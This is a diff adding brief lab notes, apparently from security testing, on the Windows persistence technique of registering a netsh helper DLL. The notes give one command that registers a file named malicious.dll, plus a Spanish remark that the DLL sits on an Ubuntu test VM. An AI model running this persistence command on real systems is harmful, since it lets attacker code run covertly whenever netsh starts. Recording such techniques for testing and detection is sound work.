@@ -1,0 +1,14 @@
+
+Event Triggered Execution: Netsh Helper DLL
+
+---------------------------------------------------
+
+netsh add helper C:\Users\W10_Home\Desktop\malicious.dll
+
+netsh.exe
+
+---------------------------------------------------
+
+
+la malicious.dll es la dll que esta en la mv ubuntu en ~/Desktop/pruebas/dll/pestudio
+
